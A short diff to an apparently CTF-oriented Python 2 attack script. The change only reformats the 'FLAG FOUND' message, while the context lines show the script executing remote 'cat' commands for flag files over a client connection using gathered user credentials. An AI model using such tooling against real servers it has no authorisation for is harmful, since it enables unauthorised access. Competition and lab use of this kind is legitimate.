@@ -192,7 +192,7 @@ def begin_attack(client):
             stdin, stdout, stderr = client.exec_command("cat ~/flag.txt")
             flag = stdout.readlines()
             if len(flag) > 0:
-                print "FLAG FOUND: %s" % (flag[0])
+                print "FLAG FOUND ON %s:\t %s" % (server.host, flag[0])
                 return
             else:
                 print "Flag not found on %s@%s" % (userCred, server.host)
@@ -217,7 +217,7 @@ def begin_attack(client):
                 stdin, stdout, stderr = client.exec_command("cat /home/*/flag.txt")
                 flag = stdout.readlines()
                 if len(flag) > 0:
-                    print "FLAG FOUND: %s" % (flag[0])
+                    print "FLAG FOUND ON %s:\t %s" % (server.host, flag[0])
                     return
                 else:
                     print "Flag not anywhere on %s" % (server.host)
